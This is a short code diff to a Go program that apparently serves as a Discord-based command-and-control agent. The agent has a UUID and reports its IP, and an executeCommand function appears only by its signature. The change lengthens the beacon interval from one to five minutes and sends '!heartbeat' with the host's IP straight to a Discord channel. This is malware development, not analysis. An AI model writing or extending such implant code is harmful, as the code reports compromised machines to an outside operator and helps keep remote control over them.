@@ -99,12 +99,13 @@ func main() {
 		dg.AddHandler(messageCreator)
 	}
 
+
 	go func(dg *discordgo.Session) {
-		ticker := time.NewTicker(time.Duration(1) * time.Minute)
+		ticker := time.NewTicker(time.Duration(5) * time.Minute)
 		for {
 			<-ticker.C
 			go heartBeat(dg)
-			ticker.Reset((time.Duration(1) * time.Minute))
+			ticker.Reset((time.Duration(5) * time.Minute))
 
 		}
 	}(dg)
@@ -190,8 +191,8 @@ func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate) {
 }
 
 func heartBeat(dg *discordgo.Session) {
-	newMessage := message.NewMessage(newAgent.UUID, fmt.Sprintf("!heartbeat %v", newAgent.IP), false, false, message.MESSAGE_HEARTBEAT)
-	dg.ChannelMessageSend(constants.ChannelID, newMessage)
+	// newMessage := message.NewMessage(newAgent.UUID, fmt.Sprintf("!heartbeat %v", newAgent.IP), false, false, message.MESSAGE_HEARTBEAT)
+	dg.ChannelMessageSend(channelID.ID, fmt.Sprintf("!heartbeat %v", newAgent.IP))
 }
 
 func executeCommand(command string) string {
